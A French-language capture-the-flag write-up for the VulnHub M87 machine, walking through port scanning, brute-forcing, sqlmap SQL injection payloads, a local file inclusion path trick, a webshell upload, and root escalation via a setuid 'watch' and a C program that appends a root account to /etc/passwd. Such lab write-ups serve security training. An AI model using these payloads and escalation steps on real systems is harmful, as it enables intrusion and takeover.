---
title: "Solution du CTF M87 de VulnHub"
tags: [CTF,VulnHub]
---

Le CTF [M87](https://vulnhub.com/entry/m87-1,595/) était intéressant. L'énumération initiale est assez compliquée et je me suis débloqué sur un coup de chance. Pensez aux paramètres !

## Lucky 7

C'est parti pour le classique scan de ports :

```
Nmap scan report for 192.168.56.223
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE         VERSION
22/tcp   filtered ssh
80/tcp   open     http            Apache httpd 2.4.38 ((Debian))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.38 (Debian)
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|_  /admin/backup/: Possible backup
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
--- snip ---
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
9090/tcp open     ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
```

Ce port 9090 correspond à l'application web [Cockpit](https://cockpit-project.org/). Voici une description tirée du projet :

> Thanks to Cockpit intentionally using system APIs and commands, a whole team of admins can manage a system in the way they prefer, including the command line and utilities right alongside Cockpit.

C'est donc une interface d'administration de serveur. Sur `exploit-db` on trouve des résultats pour *cockpit,* mais ils font référence à un CMS et non cette appli web.

J'ai énuméré les différents dossiers et fichiers sur le port 80 :

```
200       85l      159w     4393c http://192.168.56.223/admin/
200       26l       67w     1322c http://192.168.56.223/index.html
200       21l      169w     1073c http://192.168.56.223/LICENSE
301        9l       28w      317c http://192.168.56.223/assets
301        9l       28w      323c http://192.168.56.223/admin/images
301        9l       28w      319c http://192.168.56.223/admin/js
200       85l      159w     4393c http://192.168.56.223/admin/index.php
301        9l       28w      320c http://192.168.56.223/admin/css
301        9l       28w      323c http://192.168.56.223/admin/backup
200       88l      161w     4412c http://192.168.56.223/admin/backup/index.php
200       85l      159w     4393c http://192.168.56.223/admin/
200       17l       69w     1151c http://192.168.56.223/admin/images/
200       16l       59w      948c http://192.168.56.223/admin/js/
200       17l       68w     1143c http://192.168.56.223/admin/css/
301        9l       28w      329c http://192.168.56.223/admin/images/icons
200       88l      161w     4412c http://192.168.56.223/admin/backup/
200       16l       59w      982c http://192.168.56.223/admin/images/icons/
```

J'ai même poussé le bouchon pour chercher les extensions `php`, `html`, `txt`, `zip`, `sql` et `conf`.

Dans `/admin` et `/admin/backup` on trouve une page de login (`index.php`) mais aucune n'est vulnérable à une injection SQL.

J'ai tenté de bruteforcer un potentiel compte `admin` avec la wordlist `rockyou` :

```console
$ ffuf -u "http://192.168.56.223/admin/?username=admin&pass=FUZZ" -w rockyou.txt  -fs 4393

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.223/admin/?username=admin&pass=FUZZ
 :: Wordlist         : FUZZ: /opt/hdd/downloads/tools/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 4393
________________________________________________

2057&id                 [Status: 200, Size: 4541, Words: 116, Lines: 85]
:: Progress: [14344390/14344390] :: Job [1/1] :: 2928 req/sec :: Duration: [2:52:46] :: Errors: 861 ::
```

C'est surprenant, on obtient un message différent avec la valeur `2057&id` qui comme on s'en doute va rajouter un paramètre `id` à l'URL.

Si je rajoute ce paramètre j'obtiens l'erreur suivante :

```console
$ curl -s "http://192.168.56.223/admin/?username=admin&pass=nawak&id" | head -1
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```

C'est donc un pur cas de chance : on a découvert un paramètre non documenté sans chercher spécifiquement à le découvrir.

Il s'avère aussi que si on passe un numéro d'utilisateur valide, le nom correspondant est affiché :

```console
$ curl -s "http://192.168.56.223/admin/?id=1" | head -1
jack
```

J'ai écrit un script pour les énumérer :

```python
import requests

sess = requests.session()
for i in range(1000):
    resp = sess.get(f"http://192.168.56.223/admin/?id={i}")
    user = resp.text.splitlines()[0].strip()
    if user:
        print(i, user)
```

J'obtiens alors :

```console
$ python3 enumerate.py 
1 jack
2 ceo
3 brad
4 expenses
5 julia
6 mike
7 adrian
8 john
9 admin
10 alex
```

Mais le mieux est encore d'avoir recours à `sqlmap` :

```bash
python sqlmap.py -u "http://192.168.56.223/admin/backup/?id=1" --risk 3 --level 5 --dbms mysql
```

Il trouve rapidement la vulnérabilité :

```
sqlmap identified the following injection point(s) with a total of 1822 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 9820 FROM(SELECT COUNT(*),CONCAT(0x716a766a71,(SELECT (ELT(9820=9820,1))),0x71716a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9136 FROM (SELECT(SLEEP(5)))MuvG)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: id=1 UNION ALL SELECT CONCAT(0x716a766a71,0x55664c4851756371795653684d6f6b574c4d4f567671557a4875424667644d5a6d7a4b44446a4c4d,0x71716a6b71)-- -
---
[09:10:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

Avec l'option `--privileges` je vois que j'ai des droits similaires au compte `root` :

```
[*] 'admin'@'localhost' (administrator) [29]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
```

Avant tout, je dumpe les mots de passe de la base qui est utilisée pour le login :

```
Database: db
Table: users
[10 entries]
+----+--------------------+-----------------+----------+
| id | email              | password        | username |
+----+--------------------+-----------------+----------+
| 1  | jack@localhost     | gae5g5a         | jack     |
| 2  | ceo@localhost      | 5t96y4i95y      | ceo      |
| 3  | brad@localhost     | gae5g5a         | brad     |
| 4  | expenses@localhost | 5t96y4i95y      | expenses |
| 5  | julia@localhost    | fw54vrfwe45     | julia    |
| 6  | mike@localhost     | 4kworw4         | mike     |
| 7  | adrian@localhost   | fw54vrfwe45     | adrian   |
| 8  | john@localhost     | 4kworw4         | john     |
| 9  | admin@localhost    | 15The4Dm1n4L1f3 | admin    |
| 10 | alex@localhost     | dsfsrw4         | alex     |
+----+--------------------+-----------------+----------+
```

J'ai tenté d'utiliser les identifiants sur les mires de login... mais sans succès (on reste sur la même page).

## Kansas City Shuffle

Vu que je dispose du privilège `FILE` je peux utiliser le mot clé `LOAD_FILE` de MySQL. Avec `sqlmap` ça se fait avec l'option `--file-read=/var/www/html/admin/index.php` pour lire le code de la page de login :

```php
<?php                                                                                                                  
if (isset($_GET['id'])) {                                                                                              
    $id = $_GET['id'];                                                                                                 
    $mysqli = new mysqli('localhost', 'admin', 'MySQL1sn0tth33n3my', 'db');                                            

    if ($mysqli->connect_errno) {                                                                                      
        printf("Connect failed: %s\n", $mysqli->connect_error);                                                        
        exit();                                                                                                        
    }                                                                                                                  

    $sql = "SELECT username FROM users WHERE id = $id";                                                                

    if ($result = $mysqli->query($sql)) {                                                                              
        while($obj = $result->fetch_object()){                                                                         
            print($obj->username);                                                                                     
        }                                                                                                              
    } elseif ($mysqli->error) {                                                                                        
        print($mysqli->error);                                                                                         
    }                                                                                                                  
}                                                                                                                      
?>
```

Effectivement, le traitement du formulaire de login n'est pas géré, seul le paramètre `id` est réellement traité.

Toujours avec `--file-read` je peux lire `/etc/passwd` et trouver un utilisateur :

```
charlotte:x:1000:1000:charlotte,,,:/home/charlotte:/bin/bash
```

Je lis aussi la mire présente dans `/backup` :

```php
<html>

</html>
<?php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('../index.php' . $file);
?>
```

Il y a une faille d'inclusion locale via un autre paramètre caché, mais elle se fait en suffixe d'un nom de fichier.

Si je passe `/../../../../../etc/passwd` comme paramètre pour `file` alors l'inclusion échoue, car le script tente d'inclure `../index.php/../../../../../etc/passwd` et `index.php` est un fichier et non un dossier.

En revanche, si sur le chemin PHP trouve un nom de fichier ou dossier invalide alors ça fonctionne :

```
http://192.168.56.223/admin/backup/index.php?file=x/../../../../../etc/passwd
```

Ici le script va inclure `../index.phpx/../../../../../etc/passwd` et il ignore le fait que `index.phpx` n'existe pas.

Au lieu de chercher à inclure un fichier de log sur le système (après le bourrinage qu'a reçu le serveur web), j'utilise les options `--file-write=cmd.php` et `--file-dest=/dev/shm/cmd.php` pour uploader un webshell dans le dossier `/dev/shm` de la VM.

Je peux alors obtenir mon exécution de commande de cette façon :

```
http://192.168.56.223/admin/backup/index.php?cmd=id&file=x/../../../../../dev/shm/cmd.php
```

Ce qui me donne :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## People I used to know just don't know me no mo'

Je remarque deux binaires officiels sous Linux qui n'ont d'habitude pas le bit setuid, il s'agit de `rsync` et `watch` :

```console
www-data@M87:/$ find / -type f -perm -u+s -ls 2> /dev/null
    23577    380 -rwsr-xr--   1 root     dip        386792 Feb 20  2020 /usr/sbin/pppd
    22830   1308 -rwsr-xr-x   1 root     root      1335944 Sep 26  2020 /usr/sbin/exim4
     6281     28 -rwsr-sr-x   1 root     root        27048 May 31  2018 /usr/bin/watch
       55     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
       52     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
    19205    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
    20671    492 -rwsr-sr-x   1 root     root       500088 Mar 15  2019 /usr/bin/rsync
     3583     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
       53     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
    21391    152 -rwsr-xr-x   1 root     root       154352 Mar 21  2019 /usr/bin/ntfs-3g
    18938     36 -rwsr-xr-x   1 root     root        34896 Apr 22  2020 /usr/bin/fusermount
       56     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
     3908     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
     3436     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
    21241     24 -rwsr-xr-x   1 root     root        23288 Jan 15  2019 /usr/bin/pkexec
     3910     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   136894     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    12760     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    21244     20 -rwsr-xr-x   1 root     root          18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    21747     52 -rwsr-x---   1 root     cockpit-wsinstance    52368 Oct  2  2020 /usr/lib/cockpit/cockpit-session
    16143    428 -rwsr-xr-x   1 root     root                 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
```

`watch` est un programme qui exécute une commande en boucle et affiche son output. Pratique si vous voulez surveiller l'apparition d'un fichier avec `ls`.

Seulement si j'exécute `watch id` je remarque que l'effective UID est droppé :  `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Cela est dû à l'utilisation de bash pour exécuter la commande comme mentionné dans la page de manuel :

```
  -x, --exec
    Pass command to exec(2) instead of sh -c which reduces the need to use extra quoting to get the desired effect.
```

Avec cette option `-x` ça fonctionne, `watch -x id` donne le résultat `uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)`.

Le problème de l'option `-x` c'est que l'on ne peut pas passer de paramètres à la commande à exécuter.

J'ai donc écrit un programme qui rajoutera une ligne à `/etc/passwd` :

```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(void) {
  FILE * fd;
  fd = fopen("/etc/passwd", "a");
  fputs("devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh\n", fd);
  fclose(fd);
}
```

Ça fonctionne :

```console
www-data@M87:/tmp$ watch -x ./add_user 
www-data@M87:/tmp$ tail /etc/passwd
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
charlotte:x:1000:1000:charlotte,,,:/home/charlotte:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
Debian-exim:x:109:116::/var/spool/exim4:/usr/sbin/nologin
cockpit-ws:x:110:117::/nonexisting:/usr/sbin/nologin
cockpit-wsinstance:x:111:118::/nonexisting:/usr/sbin/nologin
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
www-data@M87:/tmp$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.txt
# cat proof.txt


MMMMMMMM               MMMMMMMM     888888888     77777777777777777777
M:::::::M             M:::::::M   88:::::::::88   7::::::::::::::::::7
M::::::::M           M::::::::M 88:::::::::::::88 7::::::::::::::::::7
M:::::::::M         M:::::::::M8::::::88888::::::8777777777777:::::::7
M::::::::::M       M::::::::::M8:::::8     8:::::8           7::::::7
M:::::::::::M     M:::::::::::M8:::::8     8:::::8          7::::::7
M:::::::M::::M   M::::M:::::::M 8:::::88888:::::8          7::::::7
M::::::M M::::M M::::M M::::::M  8:::::::::::::8          7::::::7
M::::::M  M::::M::::M  M::::::M 8:::::88888:::::8        7::::::7
M::::::M   M:::::::M   M::::::M8:::::8     8:::::8      7::::::7
M::::::M    M:::::M    M::::::M8:::::8     8:::::8     7::::::7
M::::::M     MMMMM     M::::::M8:::::8     8:::::8    7::::::7
M::::::M               M::::::M8::::::88888::::::8   7::::::7
M::::::M               M::::::M 88:::::::::::::88   7::::::7
M::::::M               M::::::M   88:::::::::88    7::::::7
MMMMMMMM               MMMMMMMM     888888888     77777777


Congratulations!

You've rooted m87!

21e5e63855f249bcd1b4b093af669b1e

mindsflee
```

## Via Cockpit

La technique attendue était la suivante : armé du nom d'utilisateur `charlotte` trouvé dans `/etc/passwd` et du mot de passe `15The4Dm1n4L1f3` trouvé dans MySQL on pouvait se connecter à `Cockpit` et obtenir un terminal sur l'interface web. Il suffisait ensuite d'exploiter l'escalade de privilèges.
